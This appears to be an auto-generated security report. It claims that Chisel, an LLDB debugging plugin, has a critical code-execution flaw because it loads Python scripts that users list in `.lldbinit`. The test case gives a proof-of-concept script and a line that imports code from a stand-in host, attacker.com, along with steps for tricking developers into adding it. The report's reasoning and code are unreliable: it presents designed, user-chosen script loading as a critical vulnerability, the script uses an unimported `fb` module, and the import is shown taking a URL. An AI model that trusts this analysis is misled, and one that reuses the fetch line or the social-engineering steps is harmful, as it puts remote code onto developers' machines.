* Vulnerability Name: Unrestricted Custom Command Execution
* Description:
    1. A developer installs Chisel by adding a line to their `~/.lldbinit` file that imports `fbchisellldb.py`.
    2. Chisel's initialization script, `fbchisellldb.py`, automatically loads custom commands from the `commands` directory within the Chisel installation directory.
    3. The `README.md` provides instructions for developers to add their own custom commands by creating Python scripts and using `fbobjclldb.loadCommandsInDirectory('/magical/commands/')` in their `.lldbinit`.
    4. If an attacker can trick a developer into adding a malicious `command script import` line to their `.lldbinit` file, pointing to a malicious Python script, this script will be executed by LLDB when Xcode starts or when the developer sources their `.lldbinit`.
    5. This malicious script can execute arbitrary Python code within the LLDB environment, which has the same privileges as the developer running Xcode.
* Impact:
    - **High/Critical**: Arbitrary code execution on the developer's machine. An attacker can potentially gain full control of the developer's environment, steal source code, credentials, or install malware.
* Vulnerability Rank: Critical
* Currently implemented mitigations:
    - None. The project explicitly encourages and facilitates the loading of custom commands from user-defined paths.
* Missing mitigations:
    - **Input validation and sanitization**: Chisel should not automatically load and execute any Python script pointed to by the user in `.lldbinit` without any form of validation or security checks.
    - **Warning to users**:  Clear warnings in the documentation about the security risks of adding custom commands from untrusted sources.
    - **Restricting command loading**:  Consider options to restrict custom command loading to specific, trusted directories, or implement a mechanism for developers to review and approve custom commands before execution.
* Preconditions:
    - The attacker needs to trick a developer into modifying their `~/.lldbinit` file to include a malicious `command script import` line. This could be achieved through social engineering, supply chain attacks (e.g., compromising a dependency), or by compromising a developer's machine through other means and modifying the `.lldbinit` file directly.
* Source code analysis:
    - **`/code/fbchisellldb.py`:**
        ```python
        def __lldb_init_module(debugger, dict):
            filePath = os.path.realpath(__file__)
            lldbHelperDir = os.path.dirname(filePath)

            commandsDirectory = os.path.join(lldbHelperDir, "commands")
            loadCommandsInDirectory(commandsDirectory)
        ```
        - The `__lldb_init_module` function, which is the entry point for Chisel when loaded into LLDB, immediately calls `loadCommandsInDirectory`.
        ```python
        def loadCommandsInDirectory(commandsDirectory):
            for file in os.listdir(commandsDirectory):
                fileName, fileExtension = os.path.splitext(file)
                if fileExtension == ".py":
                    module = imp.load_source(fileName, os.path.join(commandsDirectory, file))

                    if hasattr(module, "lldbinit"):
                        module.lldbinit()

                    if hasattr(module, "lldbcommands"):
                        module._loadedFunctions = {}
                        for command in module.lldbcommands():
                            loadCommand(
                                module, command, commandsDirectory, fileName, fileExtension
                            )
        ```
        - `loadCommandsInDirectory` iterates through all files in the specified `commandsDirectory`.
        - For each file ending in `.py`, it uses `imp.load_source` to load and execute the Python script as a module.
        - It then checks for `lldbinit` and `lldbcommands` functions within the loaded module and executes them.
    - **`/code/README.md`:**
        ```markdown
        ## Custom Commands
        ...
        ```python
        # ~/.lldbinit
        ...
        command script import /path/to/fbobjclldb.py
        script fbobjclldb.loadCommandsInDirectory('/magical/commands/')
        ```
        - The documentation explicitly instructs users on how to load custom commands using `loadCommandsInDirectory` and import arbitrary Python scripts.

    - **Visualization:**

    ```mermaid
    graph LR
        A[lldb starts] --> B(Reads ~/.lldbinit);
        B --> C{command script import /path/to/fbchisellldb.py};
        C -- yes --> D[fbchisellldb.py init];
        D --> E[loadCommandsInDirectory];
        E --> F{Iterate files in commandsDirectory};
        F -- .py file found --> G[imp.load_source(file)];
        G --> H[Execute Python code];
        H --> I{Check for lldbcommands/lldbinit};
        I -- lldbcommands --> J[Register custom commands with LLDB];
        I -- lldbinit --> K[Execute lldbinit function];
        B --> L{command script import /path/to/malicious_script.py};
        L -- yes --> M[malicious_script.py init];
        M --> N[Execute arbitrary malicious code];
    ```

* Security test case:
    1. **Attacker creates a malicious Python script (e.g., `malicious_command.py`)**:
        ```python
        import lldb
        import os

        def lldbcommands():
            return [MaliciousCommand()]

        class MaliciousCommand(fb.FBCommand):
            def name(self):
                return 'malicious_cmd'

            def description(self):
                return 'This is a malicious command that will create a file on your desktop.'

            def run(self, arguments, options):
                with open(os.path.expanduser("~/Desktop/ATTACKED.txt"), "w") as f:
                    f.write("You have been ATTACKED by a malicious Chisel command!")
                print("Malicious command executed. Check your desktop.")

        ```
    2. **Attacker hosts this script on a publicly accessible location (e.g., `https://attacker.com/malicious_command.py`)**.
    3. **Attacker tricks the developer into adding the following line to their `~/.lldbinit` file**:
       ```python
       command script import https://attacker.com/malicious_command.py
       ```
       This could be done via email, chat, or a compromised website, instructing the developer to add this line for "debugging purposes" or to "install a helpful plugin".
    4. **The developer restarts Xcode or sources their `.lldbinit` file in an LLDB session.**
    5. **LLDB executes the `malicious_command.py` script.**
    6. **The `MaliciousCommand` is registered and available in LLDB.**
    7. **The developer (or even automatically when LLDB loads the script) can execute the malicious command by typing `malicious_cmd` in the LLDB console.**
    8. **The malicious command executes arbitrary code (in this test case, creating a file on the desktop), demonstrating the vulnerability.**
